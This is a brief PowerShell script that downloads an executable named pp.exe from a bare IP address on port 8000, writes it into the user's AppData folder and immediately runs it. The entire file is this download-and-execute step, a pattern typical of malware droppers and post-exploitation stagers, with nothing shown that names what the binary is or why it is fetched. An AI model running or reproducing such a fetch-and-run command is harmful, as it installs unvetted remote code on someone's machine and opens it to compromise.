# Define the URL and the destination path
$url = "http://10.1.1.223:8000/pp.exe"
$destination = "$env:APPDATA\pp.exe"

# Download the executable
Invoke-WebRequest -Uri $url -OutFile $destination

# Run the executable
Start-Process -FilePath $destination
